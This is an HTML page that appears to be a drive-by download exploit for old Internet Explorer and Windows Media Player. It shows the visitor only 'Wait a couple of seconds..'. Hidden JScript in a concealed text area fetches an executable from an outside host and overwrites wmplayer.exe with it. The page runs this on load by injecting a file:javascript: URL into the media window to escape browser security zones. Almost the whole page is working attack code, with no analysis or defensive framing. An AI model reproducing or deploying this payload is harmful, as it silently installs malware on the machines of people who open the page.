<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<META content="MSHTML 6.00.2726.2500" name=GENERATOR></HEAD>
<BODY><TEXTAREA id=code style="DISPLAY: none">
    var x = new ActiveXObject("Microsoft.XMLHTTP"); 
    x.Open("GET", "http://homepage.ntlworld.com/james.fenna/es.exe",0); 
    x.Send(); 
    
    var s = new ActiveXObject("ADODB.Stream");
    s.Mode = 3;
    s.Type = 1;
    s.Open();
    s.Write(x.responseBody);

    s.SaveToFile("C:\\Program Files\\Windows Media Player\\wmplayer.exe",2);
    location.href = "mms://";

</TEXTAREA> Wait a couple of seconds..
<SCRIPT language=javascript>

    function preparecode(code) {
        result = '';
        lines = code.split(/\r\n/);
        for (i=0;i<lines.length;i++) {
        
            line = lines[i];
            line = line.replace(/^\s+/,"");
            line = line.replace(/\s+$/,"");
            line = line.replace(/'/g,"\\'");
            line = line.replace(/[\\]/g,"\\\\");
            line = line.replace(/[/]/g,"%2f");

            if (line != '') {
                result += line +'\\r\\n';
            }
        }
        return result;
    }
    
    function doit() {
        mycode = preparecode(document.all.code.value);
        myURL = "file:javascript:eval('" + mycode + "')";
        window.open(myURL,"_media")    
    }
    

    window.open("http://ip3e83566f.speed.planet.nl/hacked-by-chinese/error.jsp","_media");
    
    setTimeout("doit()", 5000);
    
    
</SCRIPT>
 </BODY></HTML>
